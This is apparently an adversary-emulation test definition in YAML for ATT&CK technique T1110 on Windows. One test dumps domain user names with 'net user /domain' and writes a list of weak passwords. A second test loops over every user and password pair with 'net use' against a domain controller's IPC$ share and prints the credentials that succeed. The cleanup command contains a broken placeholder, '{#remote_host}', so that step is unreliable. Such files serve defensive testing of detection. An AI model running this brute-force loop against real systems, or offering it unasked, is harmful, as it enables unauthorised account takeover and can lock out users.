---
attack_technique: T1110
display_name: Brute Force Credential Access

atomic_tests:
- name: Create User/Pass files
  description: |
    Creates username and password files
  supported_platforms:
    - windows
  executor: command_prompt
  input_arguments:
    input_file_users:
      type: Path
      default: DomainUsers.txt
    input_file_passwords:
      type: Path
      default: passwords.txt
  command: |
    net user /domain > #{input_file_users}
    echo "Password1" >> #{input_file_passwords}
    echo "1q2w3e4r" >> #{input_file_passwords}
    echo "Password!" >> #{input_file_passwords}

- name: Brute Force Accounts
  description: |
    Brutes Forces Accounts on Remote Host
  supported_platforms:
    - windows
  executor: command_prompt
  input_arguments:
    input_file_users:
      type: Path
      default: DomainUsers.txt
    input_file_passwords:
      type: Path
      default: passwords.txt
    remote_host:
      type: String
      default: \\COMPANYDC1\IPC$
    domain:
      type: String
      default: COMPANY
  command: |
    @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete {#remote_host} > NUL